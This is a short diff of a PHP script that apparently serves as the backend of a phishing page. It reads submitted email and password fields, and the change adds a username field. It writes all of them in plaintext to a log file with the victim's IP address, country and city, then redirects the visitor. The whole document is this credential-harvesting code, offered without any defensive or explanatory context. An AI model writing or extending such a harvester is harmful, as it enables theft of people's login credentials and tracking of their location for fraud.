@@ -1,4 +1,5 @@
 <?php if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+  $user = $_POST['user'];
   $email = $_POST['email'];
   $password = $_POST['password'];
   
@@ -32,7 +33,7 @@
   }
 
   // write to log file
-  $log_data = "Date= {$date_str}\nEmail= {$email}\nPassword= {$password}\nIP Address= {$ip_address}\nCountry= {$country}\nCity= {$city}\n\n";
+  $log_data = "Date= {$date_str}\nUsername= {$user}\nEmail= {$email}\nPassword= {$password}\nIP Address= {$ip_address}\nCountry= {$country}\nCity= {$city}\n\n";
   file_put_contents('log.txt', $log_data, FILE_APPEND);
 
   // redirect to new page
